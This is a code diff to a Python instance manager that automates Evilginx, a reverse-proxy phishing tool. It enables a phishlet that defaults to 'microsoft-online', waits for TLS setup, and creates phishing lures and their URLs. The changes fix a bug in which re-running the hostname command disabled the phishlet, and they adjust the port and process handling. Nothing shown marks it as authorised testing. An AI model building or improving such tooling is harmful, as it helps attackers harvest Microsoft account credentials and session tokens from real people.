@@ -64,6 +64,7 @@ class EvilginxProc:
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
             bufsize=0,
+            start_new_session=True,
         )
         self.process = proc
         self._read_until_idle(timeout=timeout, require_data=True)
@@ -290,7 +291,7 @@ class InstanceManager:
         phishlet_hostname = payload["phishlet_hostname"]
         phishlet_name = payload.get("phishlet_name", "microsoft-online")
         loopback_ip = payload["loopback_ip"]
-        https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 443)))
+        https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 8443)))
         dns_port = int(payload["dns_port"]) if payload.get("dns_port") else int(os.environ.get("AGENT_DNS_PORT", "5302"))
         config_dir = Path(payload["config_dir"])
         autocert = bool(payload.get("autocert", self._default_autocert()))
@@ -315,15 +316,12 @@ class InstanceManager:
             logger.info("phishlets enable output: %s", resp[-300:])
             if not proc.alive():
                 raise EvilginxError(f"evilginx crashed after phishlets enable")
-            # Wait for TLS cert setup to complete (can take up to 60s)
-            for _attempt in range(30):
-                time.sleep(3)
-                status_out = proc.send(f"phishlets hostname {phishlet_name} {root_domain}", timeout=15)
-                if "enabled" in status_out.lower():
-                    logger.info("phishlet %s confirmed enabled after %d attempts", phishlet_name, _attempt + 1)
-                    break
-            else:
-                logger.warning("phishlet %s may not be fully enabled after waiting", phishlet_name)
+            # Wait for TLS cert setup to complete (can take up to 60s).
+            # Do NOT re-run 'phishlets hostname' as it disables the phishlet.
+            # Instead, just wait and check process is alive.
+            time.sleep(15)
+            if not proc.alive():
+                raise EvilginxError(f"evilginx died during TLS cert setup")
             # lure create + get-url
             lout = proc.send(f"lures create {phishlet_name}", timeout=30)
             logger.info("lures create output: %s", lout[-400:])
